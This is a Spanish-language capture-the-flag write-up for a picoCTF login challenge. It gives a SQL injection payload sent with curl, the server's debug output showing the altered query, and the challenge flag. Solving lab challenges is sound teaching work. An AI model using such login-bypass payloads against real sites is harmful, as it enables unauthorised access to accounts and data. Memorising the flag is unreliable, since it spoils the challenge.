## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!

## Solución
En consola:
```bash
amer_br_-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/39720/login.php -d "username=' or 1=1;'=admin&password=admin&debug=1"
<pre>username: ' or 1=1;'=admin
password: admin
SQL query: SELECT * FROM users WHERE name='' or 1=1;'=admin' AND password='admin'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_c218b685}
```

En la interfaz:
![[Pasted image 20240925194851.png]]
![[Pasted image 20240925194932.png]]
Ponemos como contraseña **' or 1 = 1;** 
Lo que hará va a ser editar la sentencia SQL para que nos dé acceso.
![[Pasted image 20240925195201.png]]


![[Pasted image 20240925195124.png]]
## Notas adicionales
**Inyección SQL** - La inyección SQL es una técnica de inyección de código que podría destruir su base de datos. La inyección de SQL es una de las técnicas de hackeo web más comunes. La inyección SQL es la colocación de código malicioso en declaraciones SQL, a través de la entrada de la página web.
## Referencias
[Inyección SQL](https://www.w3schools.com/sql/sql_injection.asp)